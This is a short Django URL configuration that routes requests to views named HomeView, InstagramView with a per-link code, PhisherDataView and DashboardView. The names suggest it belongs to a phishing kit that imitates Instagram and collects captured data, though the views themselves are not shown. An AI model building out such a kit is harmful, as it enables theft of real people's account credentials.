from django.urls import path, include
from .views import HomeView, InstagramView, PhisherDataView, DashboardView

urlpatterns = [
    path('', HomeView.as_view()),
    path('instagram/<str:magic_code>/', InstagramView.as_view()),
    path('data/', PhisherDataView.as_view()),
    path('dashboard/', DashboardView.as_view()),
]
